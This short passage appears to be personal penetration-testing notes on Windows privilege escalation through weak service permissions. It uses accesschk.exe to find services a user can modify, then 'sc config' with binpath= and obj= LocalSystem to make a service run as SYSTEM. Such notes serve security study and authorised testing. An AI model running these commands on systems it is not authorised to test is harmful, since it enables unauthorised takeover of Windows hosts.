1. To check the services the user has permission to modify or write:

-- .\accesschk.exe /accepteula -uqvwc <Username> * [This checks whether the user has any permission on any services]

If you found that the service is running as another user than LocalSystem then we can change the user if we have access to modify the configs.

Then we can change the user as adding 'obj= ' argument.

-- sc config <Service Name> binpath= "C:\Path\To\The\Service.exe" obj= LocalSystem
